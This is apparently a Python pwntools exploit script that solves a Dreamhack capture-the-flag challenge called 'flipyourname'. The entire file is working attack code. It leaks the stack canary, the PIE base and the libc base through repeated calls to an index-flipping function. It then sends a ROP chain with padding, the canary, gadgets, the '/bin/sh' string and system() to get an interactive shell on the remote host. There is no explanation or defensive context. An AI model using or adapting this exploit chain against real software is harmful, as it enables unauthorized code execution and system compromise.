from pwn import *

elf = ELF("./flipyourname_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf

# p = process()
p = remote("host1.dreamhack.games", 21600)
# gdb.attach(p)

def invert(index: int):
    p.sendafter(b'? ', b'a' * 0x50)
    p.sendlineafter(b':) ', str(index).encode())
    p.recvuntil(b'a' * 0x50)
    leak = p.recvline().strip()
    p.sendlineafter(b'? ', b'a')
    return leak

invert(86)
invert(87)
invert(88)
invert(102)
invert(103)
invert(110)
invert(111)
invert(112)
invert(113)
invert(114)
invert(115)
invert(116)
invert(117)
invert(118)
invert(119)
leak = invert(80)
canary = u64(b'\x00' + leak[9:16])
PIE = u64(leak[24:30].ljust(8, b'\x00')) - 0x1345
libcbase = u64(leak[-6:].ljust(8, b'\x00')) - 0x29d90
print(hex(libcbase))
print(hex(PIE))
stack = u64((leak[16:22]).ljust(8, b'\x00')) - 0x70
print(hex(stack))

print(hex(PIE + 0x04010))

invert(PIE + 0x04010 - stack)

payload = b'a' * 0x58 + pack(canary) + b'a' * 8 + pack(PIE + 0x000000000000101a) + pack(libcbase + 0x000000000002a3e5) + pack(next(libc.search(b'/bin/sh')) + libcbase) + pack(libcbase + libc.symbols['system'])
p.sendlineafter(b'name?', payload)
p.sendline(b'0')
p.sendline(b'y')
p.interactive()
